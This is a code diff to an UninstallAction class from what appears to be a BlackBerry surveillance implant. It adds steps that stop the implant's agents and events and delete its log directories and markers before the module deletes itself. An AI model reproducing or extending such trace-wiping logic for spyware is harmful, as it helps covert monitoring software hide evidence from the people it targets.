@@ -10,6 +10,10 @@ package com.ht.rcs.blackberry.action;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
 
+import com.ht.rcs.blackberry.AgentManager;
+import com.ht.rcs.blackberry.EventManager;
+import com.ht.rcs.blackberry.log.LogCollector;
+import com.ht.rcs.blackberry.log.Markup;
 import com.ht.rcs.blackberry.utils.Check;
 
 public class UninstallAction extends SubAction {
@@ -19,17 +23,22 @@ public class UninstallAction extends SubAction {
         parse(confParams);
 
         Check.requires(actionId == ACTION_UNINSTALL, "ActionId scorretto");
-
     }
 
     public UninstallAction(String host) {
         super(ACTION_UNINSTALL);
-
     }
 
     public boolean execute() {
-
+        debug.info("execute");
+        
         this.wantUninstall = true;
+        
+        AgentManager.getInstance().stopAll();
+        EventManager.getInstance().stopAll();
+        
+        LogCollector.getInstance().removeLogDirs();
+        Markup.removeMarkups();
         
         ApplicationDescriptor ad = ApplicationDescriptor.currentApplicationDescriptor();
         int moduleHandle = ad.getModuleHandle();
@@ -52,8 +61,7 @@ public class UninstallAction extends SubAction {
                 break;
             default:
                 debug.error(Integer.toString(rc));
-                return false;
-              
+                return false;              
         }
         
         return true;
